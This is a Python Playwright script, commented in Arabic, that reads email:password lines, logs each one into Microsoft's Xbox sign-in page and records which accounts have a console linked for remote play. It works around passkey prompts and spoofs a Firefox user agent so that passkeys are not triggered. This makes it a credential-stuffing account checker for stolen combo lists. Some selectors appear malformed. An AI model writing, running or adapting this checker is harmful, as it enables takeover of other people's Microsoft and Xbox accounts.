import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 90000

async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    console_url = "https://www.xbox.com/en-US/play/consoles"
    for attempt in range(3):
        try:
            await page.goto(console_url, timeout=DEFAULT_TIMEOUT)
            await page.wait_for_load_state("networkidle", timeout=DEFAULT_TIMEOUT)
            await asyncio.sleep(5)
            text = (await page.inner_text("body")).lower()
            if "play your console remotely" in text:
                return True, "يوجد جهاز", True
            if "set up your console" in text:
                return False, "مسجل ولا يوجد جهاز", True
            if "sign in to finish setting up" in text:
                return False, "تسجيل دخول غير مكتمل", False
        except Exception as e:
            print(f"Error checking console (attempt {attempt+1}): {e}")
            continue
    return False, "لم يتم العثور على جهاز", False

async def handle_password_entry(page, password: str) -> bool:
    try:
        # محاولة تجاوز Passkey إذا ظهرت
        # نبحث عن خيار "Other ways to sign in" أو "Use your password"
        other_ways = page.locator("text='Other ways to sign in', text='Use your password', text='Use password instead'")
        if await other_ways.is_visible(timeout=5000):
            await other_ways.click()
            await asyncio.sleep(2)
            # إذا ظهرت قائمة خيارات، نختار كلمة المرور
            password_option = page.locator("role=button[name*='Password'], text='Password'")
            if await password_option.is_visible(timeout=5000):
                await password_option.click()
                await asyncio.sleep(2)

        # البحث عن حقل كلمة المرور
        password_input = page.locator("input[type='password'], name='passwd'")
        await password_input.wait_for(state="visible", timeout=15000)
        await password_input.fill(password)
        await asyncio.sleep(2)
        
        # النقر على زر الدخول
        submit_button = page.locator("input[type='submit'], id='idSIButton9'")
        await submit_button.click()
        return True
    except Exception as e:
        print(f"Error in handle_password_entry: {e}")
        return False

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        # استخدام User Agent مختلف لتجنب تفعيل Passkey تلقائياً
        browser = await p.chromium.launch(headless=headless, args=['--no-sandbox', '--disable-setuid-sandbox'])
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0' # تمويه كمتصفح فايرفوكس قديم قليلاً
        )
        page = await context.new_page()
        
        # التوجه لصفحة تسجيل الدخول
        login_url = "https://www.xbox.com/en-US/auth/msa?action=logIn&returnUrl=http%3A%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles"
        await page.goto(login_url, timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")

        # إدخال البريد
        email_input = page.locator("input[type='email'], name='loginfmt'")
        await email_input.wait_for(state="visible", timeout=DEFAULT_TIMEOUT)
        await email_input.fill(account['email'])
        
        # النقر على التالي
        next_button = page.locator("input[type='submit'], id='idSIButton9'")
        await next_button.click()
        await asyncio.sleep(3)

        # معالجة كلمة المرور وتجاوز Passkey
        if not await handle_password_entry(page, account['password']):
            raise Exception("فشل في الوصول لحقل كلمة المرور أو تجاوز Passkey")

        # التعامل مع شاشة "Stay signed in?"
        try:
            stay_signed_in = page.locator("input[type='submit'], id='idSIButton9', value='Yes'")
            await stay_signed_in.wait_for(state="visible", timeout=10000)
            await stay_signed_in.click()
        except:
            pass

        # فحص الجهاز
        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info
        
        await browser.close()
        await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ: {str(e)[:100]}"
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            parts = line.split(':', 1)
            if len(parts) == 2:
                accounts.append({'email': parts[0].strip(), 'password': parts[1].strip()})
    return accounts
